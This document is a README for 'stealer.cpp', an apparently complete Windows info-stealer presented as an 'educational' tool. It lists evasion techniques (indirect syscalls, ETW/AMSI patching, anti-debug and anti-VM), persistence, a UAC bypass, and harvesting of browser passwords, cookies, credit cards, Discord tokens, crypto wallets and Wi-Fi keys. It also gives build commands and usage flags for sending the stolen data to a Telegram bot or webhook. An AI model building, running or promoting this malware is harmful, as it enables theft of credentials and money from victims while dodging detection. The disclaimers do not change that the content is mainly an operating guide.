Stealer.cpp – Educational Credential Extraction Tool

⚠️ WARNING: This project is provided for educational and defensive research purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author is not responsible for any misuse.

---

Overview

stealer.cpp is a fully-featured Windows credential and data extraction tool, designed to demonstrate a wide range of offensive security techniques commonly used in modern malware. It implements:

· Indirect syscalls (Hell’s Gate + custom stubs) to bypass user-mode hooks.
· ETW/AMSI patching to evade detection.
· Anti‑debugging & anti‑VM measures.
· UAC bypass and privilege escalation.
· Persistence via Run key and scheduled tasks.
· Extraction of passwords, cookies, credit cards, history, bookmarks, autofill, and Discord tokens from Chromium‑based browsers (Chrome, Edge, Brave, Opera, Vivaldi, etc.) and Firefox.
· Recovery of crypto wallets, VPN configurations, Wi‑Fi passwords, FileZilla sites, Outlook profiles, Steam credentials, and Telegram sessions.
· Memory scanning for passwords and tokens in running processes.
· Exfiltration via Telegram bot or custom webhook.

The code is intentionally kept as a single self‑contained file to simplify study.

---

Features

Category Features
Evasion Indirect syscalls (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, etc.), ETW/AMSI patching, unhooking of ntdll, anti‑debug (debugger detection, timing checks, hardware breakpoints), VM detection (hypervisor, low RAM, few CPUs, small disk).
Persistence Adds itself to HKCU\Software\Microsoft\Windows\CurrentVersion\Run and creates a scheduled task running as SYSTEM.
Privilege Escalation UAC bypass using the ms-settings registry trick + token duplication to launch a SYSTEM shell.
Browser Data Decrypts AES‑GCM (v10/v11) and DPAPI‑encrypted data from Chromium‑based browsers using the master key from Local State. Supports App‑Bound encryption (APPB) via COM elevation. Extracts logins, cookies, credit cards, history, bookmarks, autofill, and Discord tokens.
Firefox Reads logins.json and cookies.sqlite (decryption not fully implemented, but marks files for later processing).
System Data Wi‑Fi passwords (via WLAN API), VPN configs (NordVPN, ExpressVPN, ProtonVPN), FileZilla sitemanager.xml, Outlook registry keys, Steam loginusers.vdf, Telegram Desktop session files, crypto wallets (Exodus, Electrum, Atomic, Guarda, Coinomi, Binance, MetaMask, Trust, Phantom).
Memory Scraping Scans memory of chrome.exe, msedge.exe, brave.exe, opera.exe for JSON‑like "password":"..." and Discord‑style tokens.
Exfiltration Uploads the collected JSON file to a Telegram bot (via sendDocument) or a custom HTTPS webhook using multipart/form‑data.
Output Writes data to C:\ProgramData\SystemCache\stealer_output.json and a pretty‑printed full_data.json.

---

Compilation

The project is written for Visual Studio (x64) and depends on several libraries:

· OpenSSL (libcrypto, libssl)
· SQLite3
· nlohmann/json
· zlib (optional, for compression, but not heavily used)
· Windows SDK (user32, shell32, advapi32, crypt32, winhttp, wlanapi, iphlpapi, ntdll, ole32, oleaut32, wbemuuid, dbghelp, psapi)

Compiler Command Line

```bash
cl /EHsc /std:c++17 /O2 /MD /D_UNICODE /DUNICODE ^
   /I"C:\path\to\openssl\include" /I"C:\path\to\sqlite3" /I"C:\path\to\nlohmann" ^
   stealer.cpp /link /LIBPATH:"C:\path\to\openssl\lib" ^
   libcrypto.lib libssl.lib sqlite3.lib zlib.lib ^
   user32.lib shell32.lib advapi32.lib crypt32.lib ^
   winhttp.lib wlanapi.lib iphlpapi.lib ntdll.lib ^
   ole32.lib oleaut32.lib wbemuuid.lib dbghelp.lib psapi.lib
```

Note: Replace the include and library paths with the actual locations of the dependencies. The project is 64‑bit only.

---

Usage

The executable accepts several command‑line arguments:

Argument Description
--telegram-token <token> Bot token for Telegram exfiltration.
--telegram-chat <chat_id> Chat ID for Telegram exfiltration.
--webhook <url> Custom webhook URL (HTTPS).
--no-exfil Skip exfiltration.
--no-compress Disable compression (unused stub).
--no-silent Show console output (default is silent).
--no-antidebug Disable anti‑debug/VM loop.
--no-persistence Disable persistence installation.
--threads <n> Number of threads for browser processing (default = hardware concurrency).
--output-dir <path> Output directory (default: C:\ProgramData\SystemCache).
--browsers-filter <name1,name2,...> Comma‑separated list of browsers to process (e.g., Chrome,Edge).
--app-key-decrypt <encrypted_key> Internal use for App‑Bound decryption via COM elevation.
--browser-app-path <path> Path to browser executable (used with above).

Example:

```bash
stealer.exe --telegram-token "123:abc" --telegram-chat "456" --threads 4
```

If no arguments are given, it runs with default settings (anti‑debug, persistence, all browsers, all data types, and exfiltration only if Telegram or webhook credentials are provided).

---

How It Works (High‑Level)

1. Initialisation – Loads ntdll.dll, resolves syscall numbers via Hell’s Gate, unhooks ntdll, finds a syscall; ret gadget, patches ETW and AMSI.
2. Anti‑Debug – Spawns a background thread that continuously checks for debuggers, VMs, and triggers a busy‑loop if detected.
3. Persistence & UAC – Installs itself in Run and creates a scheduled task; attempts UAC bypass and token duplication to gain SYSTEM privileges.
4. Data Collection – Enumerates browser user data directories, extracts the master key (DPAPI or App‑Bound), and then uses a thread pool to parse SQLite databases and JSON files.
5. Additional Modules – Collects Wi‑Fi, VPN, crypto wallets, memory scrapes, etc.
6. Output – All entries are written to a JSON array in stealer_output.json and a structured full_data.json.
7. Exfiltration – If configured, the output file is uploaded via Telegram or webhook.

---

Educational Purpose

This project is a case study for understanding:

· Windows internals (syscalls, PE parsing, DLL unhooking).
· Anti‑analysis techniques (debugger detection, timing, VM checks).
· Cryptography (DPAPI, AES‑GCM, COM‑based App‑Bound decryption).
· SQLite database parsing and browser storage formats.
· Process memory scanning and pattern matching.
· Common persistence and privilege escalation vectors.
· Secure exfiltration over HTTPS.

By studying the code, security researchers and students can learn about the inner workings of modern info‑stealing malware, which helps in building better detection and defensive strategies.

---

Disclaimer

This software is intended for academic and defensive purposes only.
Do not run it on any system without explicit written permission from the owner. The authors and contributors are not liable for any damage or legal consequences arising from misuse. Use at your own risk.

---

License

This project is provided under the MIT License – see the LICENSE file for details.

---

Acknowledgements

· Hell’s Gate – for the syscall resolution technique.
· nlohmann/json – JSON library.
· OpenSSL and SQLite projects for their libraries.

---

Contact

For questions or suggestions regarding this educational tool, please open an issue on the GitHub repository.
Do not ask for help in using this for malicious purposes.
